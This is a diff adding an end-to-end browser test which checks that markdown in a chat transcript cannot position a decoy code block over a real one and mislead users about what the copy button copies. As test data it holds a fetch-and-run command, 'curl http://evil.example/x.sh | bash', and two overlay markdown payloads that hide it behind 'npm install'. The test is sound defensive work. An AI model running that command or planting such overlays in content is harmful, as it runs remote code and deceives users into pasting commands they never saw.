@@ -47,6 +47,73 @@ async function openTranscript(page: Page): Promise<void> {
   await page.goto(`/chat/${SESSION_A.id}`);
 }
 
+// #3151: author markdown could position content over a code block, so the
+// reader saw one command while the button copied another. Both spellings are
+// here because the fix for one would not have fixed the other — every utility
+// the class variant needs ships in the app's own stylesheet.
+//
+// This is an e2e and not a unit test on purpose: the claim is about what is
+// ON SCREEN, and jsdom does no layout, so only a real browser can settle it.
+test.describe("author markdown cannot hide what the button copies (#3151)", () => {
+  const REAL = "curl http://evil.example/x.sh | bash";
+  const overlays: { name: string; markdown: string }[] = [
+    {
+      name: "inline style",
+      markdown: [
+        '<div style="position:relative">',
+        "",
+        "```sh",
+        REAL,
+        "```",
+        "",
+        '<pre style="position:absolute; inset:0; z-index:1; margin:0; background:white; pointer-events:none"><code>npm install</code></pre>',
+        "</div>",
+      ].join("\n"),
+    },
+    {
+      name: "utility classes, no style attribute at all",
+      markdown: [
+        '<div class="relative">',
+        "",
+        "```sh",
+        REAL,
+        "```",
+        "",
+        '<pre class="absolute inset-0 z-10 bg-white pointer-events-none"><code>npm install</code></pre>',
+        "</div>",
+      ].join("\n"),
+    },
+  ];
+
+  overlays.forEach(({ name, markdown }) => {
+    test(`the copied text is the visible text — ${name}`, async ({ page, context }) => {
+      await context.grantPermissions(["clipboard-read", "clipboard-write"]);
+      await mockAllApis(page);
+      const transcript = [
+        { type: "session_meta", roleId: "general", sessionId: SESSION_A.id },
+        { type: "text", source: "assistant", message: markdown },
+      ];
+      await page.route(
+        (url) => url.pathname === `/api/sessions/${SESSION_A.id}`,
+        (route) => (route.request().method() === "GET" ? route.fulfill({ json: transcript }) : route.fallback()),
+      );
+      await page.goto(`/chat/${SESSION_A.id}`);
+      const button = page.locator("[data-code-copy]").first();
+      await button.waitFor();
+
+      // The decoy must not be positioned any more...
+      const decoy = page.locator("pre").filter({ hasText: "npm install" }).first();
+      expect(await decoy.evaluate((node) => getComputedStyle(node).position)).toBe("static");
+      // ...so the real command is on screen, which is the actual invariant:
+      // the reader can see what they are about to copy.
+      await expect(page.getByText(REAL).first()).toBeVisible();
+
+      await button.click();
+      expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(REAL);
+    });
+  });
+});
+
 test.describe("code block copy button", () => {
   test("renders one visible copy button per fenced block, and none for mermaid or inline code", async ({ page }) => {
     await openTranscript(page);
